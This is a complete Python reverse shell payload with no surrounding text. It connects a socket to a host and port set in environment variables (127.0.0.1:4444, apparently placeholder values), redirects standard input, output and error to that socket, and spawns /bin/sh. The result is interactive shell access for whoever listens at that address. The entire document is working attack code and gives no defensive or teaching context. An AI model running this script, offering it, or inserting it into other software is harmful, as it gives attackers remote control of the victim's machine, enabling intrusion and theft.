import sys,socket,os,pty;
os.environ["RHOST"] = "127.0.0.1"
os.environ["RPORT"] = "4444"
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("/bin/sh")
